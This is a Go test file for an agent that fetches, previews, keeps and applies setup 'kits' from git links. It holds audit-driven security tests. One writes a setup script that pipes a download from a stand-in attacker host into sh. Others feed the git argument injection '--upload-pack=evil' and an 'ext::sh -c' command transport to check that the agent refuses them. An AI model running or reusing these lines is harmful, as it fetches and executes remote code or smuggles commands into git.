package agent

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cosscom/shipyard/internal/box"
)

// kitRepo makes a git repository holding a kit in kits/cal.
func kitRepo(t *testing.T, version string) string {
	t.Helper()
	repo := t.TempDir()
	dir := filepath.Join(repo, "kits", "cal")
	os.MkdirAll(filepath.Join(dir, "scripts"), 0o755)
	k := box.Kit{ID: "cal-dev", Name: "Cal.com dev", Version: version, Match: box.KitMatch{Slug: "calcom/cal"},
		Config: box.RepoConfig{Setup: "$BERTH_KIT_DIR/scripts/setup.sh"}}
	b, _ := json.Marshal(k)
	os.WriteFile(filepath.Join(dir, "kit.json"), b, 0o644)
	os.WriteFile(filepath.Join(dir, "scripts", "setup.sh"), []byte("#!/bin/sh\necho set up "+version+"\n"), 0o755)
	for _, args := range [][]string{{"init", "-q", "-b", "main"}, {"add", "."}, {"-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "kit"}} {
		if out, err := exec.Command("git", append([]string{"-C", repo}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %s", args, out)
		}
	}
	return repo
}

// allowFileKits lets a test fetch a kit from a folder's git repository,
// which the agent refuses for links (security audit L-8).
func allowFileKits(t *testing.T) {
	old := box.GitProtocols
	box.GitProtocols += ":file"
	t.Cleanup(func() { box.GitProtocols = old })
}

func TestAKitIsFetchedFromALinkReviewedKeptAndApplied(t *testing.T) {
	allowFileKits(t)
	b := newBox(t)
	var got box.KitInstall
	b.server.Handle("PUT /v1/locations/{name}/kit", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		json.Unmarshal(body, &got)
		json.NewEncoder(w).Encode(box.KitResult{Kit: box.InstalledKit{ID: got.Kit.ID, Hash: got.Hash}, Warnings: []string{}})
	}))
	b.server.Handle("GET /v1/kits", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode([]box.InstalledKitAt{{Location: "cal", Kit: box.InstalledKit{ID: "cal-dev", Hash: got.Hash}}})
	}))
	a := startAgent(t, b.pairLaptop())
	tok := uiToken(t, a)
	eventually(t, "box online", func() bool { return stateOf(t, a) == StateOnline })
	repo := kitRepo(t, "1.0.0")
	src := "file://" + repo + "#kits/cal"

	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
	if resp.StatusCode != 200 || !strings.Contains(body, `"cal-dev"`) || !strings.Contains(body, "echo set up 1.0.0") {
		t.Fatalf("preview: %d %s", resp.StatusCode, body)
	}
	if _, body := uiSend(t, a, "GET", "/v1/kits", tok, ""); strings.Contains(body, "cal-dev") {
		t.Fatal("a preview kept the kit")
	}
	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`"}`); resp.StatusCode != 200 {
		t.Fatalf("add: %d %s", resp.StatusCode, body)
	}
	_, body = uiSend(t, a, "GET", "/v1/kits", tok, "")
	var kits []KitInfo
	json.Unmarshal([]byte(body), &kits)
	if len(kits) != 1 || kits[0].Source == nil || kits[0].Source.Commit == "" || kits[0].Origin != "user" {
		t.Fatalf("kits = %s", body)
	}

	_, body = uiSend(t, a, "POST", "/v1/kits/cal-dev/apply", tok, `{"targets":[{"box":"devbox","location":"cal"},{"box":"nobox","location":"cal"}]}`)
	if !strings.Contains(body, `"applied":1`) || !strings.Contains(body, "no paired box named nobox") {
		t.Fatalf("apply streamed %s", body)
	}
	script, _ := base64.StdEncoding.DecodeString(got.Files["scripts/setup.sh"])
	if got.Kit.ID != "cal-dev" || !strings.Contains(string(script), "set up 1.0.0") || got.Source != src || got.Hash != kits[0].Hash {
		t.Fatalf("the box got %+v", got)
	}

	// A new version upstream makes the installed one outdated once updated here.
	_, body = uiSend(t, a, "GET", "/v1/kits/installed", tok, "")
	if !strings.Contains(body, `"outdated":false`) {
		t.Fatalf("installed = %s", body)
	}
	os.WriteFile(filepath.Join(repo, "kits", "cal", "scripts", "setup.sh"), []byte("#!/bin/sh\necho set up 2\n"), 0o755)
	exec.Command("git", "-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "v2").Run()
	if _, body := uiSend(t, a, "POST", "/v1/kits/cal-dev/update", tok, ""); !strings.Contains(body, `"changed":true`) {
		t.Fatalf("update = %s", body)
	}
	if _, body := uiSend(t, a, "GET", "/v1/kits/installed", tok, ""); !strings.Contains(body, `"outdated":true`) {
		t.Fatalf("after updating, installed = %s", body)
	}
}

func TestKitLinksMustPointAtAKit(t *testing.T) {
	allowFileKits(t)
	b := newBox(t)
	a := startAgent(t, b.pairLaptop())
	tok := uiToken(t, a)
	empty := t.TempDir()
	for _, src := range []string{"", "--upload-pack=evil", empty, "file://" + kitRepo(t, "1") + "#nope"} {
		if resp, _ := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`); resp.StatusCode != 400 {
			t.Errorf("%q: %d, want 400", src, resp.StatusCode)
		}
	}
}

// A kit link only gets network transports: file:// and ext:: are refused.
func TestKitLinksCannotUseLocalOrCommandTransports(t *testing.T) {
	b := newBox(t)
	a := startAgent(t, b.pairLaptop())
	tok := uiToken(t, a)
	marker := filepath.Join(t.TempDir(), "ext-ran")
	for _, src := range []string{"file://" + kitRepo(t, "1") + "#kits/cal", "ext::sh -c touch% " + marker} {
		if resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`); resp.StatusCode != 400 {
			t.Errorf("%q: %d %s, want 400", src, resp.StatusCode, body)
		}
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("ext:: ran a command")
	}
}

// What is kept and applied is exactly the kit that was reviewed: a source
// that changes between the preview and the add is refused (security audit
// L-9; the audit's PoC TestReviewedKitIsNotTheKitKept).
func TestOnlyTheReviewedKitIsKeptAndApplied(t *testing.T) {
	allowFileKits(t)
	b := newBox(t)
	a := startAgent(t, b.pairLaptop())
	tok := uiToken(t, a)
	repo := kitRepo(t, "1.0.0")
	src := "file://" + repo + "#kits/cal"

	var preview struct{ Kit KitInfo }
	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
	if resp.StatusCode != 200 || json.Unmarshal([]byte(body), &preview) != nil || preview.Kit.Hash == "" {
		t.Fatalf("preview: %d %s", resp.StatusCode, body)
	}
	// The kit's owner pushes between the review and the click.
	os.WriteFile(filepath.Join(repo, "kits", "cal", "scripts", "setup.sh"), []byte("#!/bin/sh\ncurl -s https://attacker.invalid/x | sh\n"), 0o755)
	exec.Command("git", "-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "evil").Run()
	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`","hash":"`+preview.Kit.Hash+`"}`); resp.StatusCode != 409 {
		t.Fatalf("add after the source changed: %d %s, want 409", resp.StatusCode, body)
	}
	if _, body := uiSend(t, a, "GET", "/v1/kits", tok, ""); strings.Contains(body, "cal-dev") {
		t.Fatalf("the changed kit was kept: %s", body)
	}
	// Reviewing again and adding what was shown works.
	uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
	_, body = uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
	json.Unmarshal([]byte(body), &preview)
	resp, body = uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`","hash":"`+preview.Kit.Hash+`"}`)
	if resp.StatusCode != 200 {
		t.Fatalf("add of the reviewed kit: %d %s", resp.StatusCode, body)
	}
	// Applying with a hash other than the kept kit's is refused.
	if resp, body := uiSend(t, a, "POST", "/v1/kits/cal-dev/apply", tok, `{"targets":[{"box":"devbox","location":"cal"}],"hash":"000000000000"}`); resp.StatusCode != 409 {
		t.Fatalf("apply of a kit other than the reviewed one: %d %s, want 409", resp.StatusCode, body)
	}
}

// A link copied from a commit's page names the commit by its hash, which
// git clone --branch refuses: the kit is fetched at that commit, by its
// full or shortened hash, even once the branch has moved on.
func TestAKitLinkCanPinACommit(t *testing.T) {
	allowFileKits(t)
	repo := kitRepo(t, "1.0.0")
	out, err := exec.Command("git", "-C", repo, "rev-parse", "HEAD").Output()
	if err != nil {
		t.Fatal(err)
	}
	pinned := strings.TrimSpace(string(out))
	os.WriteFile(filepath.Join(repo, "kits", "cal", "scripts", "setup.sh"), []byte("#!/bin/sh\necho set up 2\n"), 0o755)
	exec.Command("git", "-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "v2").Run()
	setup := func(dir string) string {
		b, _ := os.ReadFile(filepath.Join(dir, "kits", "cal", "scripts", "setup.sh"))
		return string(b)
	}

	for _, ref := range []string{pinned, pinned[:12]} {
		dir := filepath.Join(t.TempDir(), "repo")
		if err := cloneAt(t.Context(), "file://"+repo, ref, dir); err != nil {
			t.Fatalf("at %s: %v", ref, err)
		}
		if !strings.Contains(setup(dir), "set up 1.0.0") {
			t.Fatalf("at %s: setup.sh = %q", ref, setup(dir))
		}
	}
	if err := cloneAt(t.Context(), "file://"+repo, "0123456789ab", filepath.Join(t.TempDir(), "repo")); err == nil || !strings.Contains(err.Error(), "no commit 0123456789ab") {
		t.Fatalf("a missing commit: %v", err)
	}
	// A branch still comes from a shallow clone of that branch.
	dir := filepath.Join(t.TempDir(), "repo")
	if err := cloneAt(t.Context(), "file://"+repo, "main", dir); err != nil || !strings.Contains(setup(dir), "set up 2") {
		t.Fatalf("at main: %v %q", err, setup(dir))
	}
}
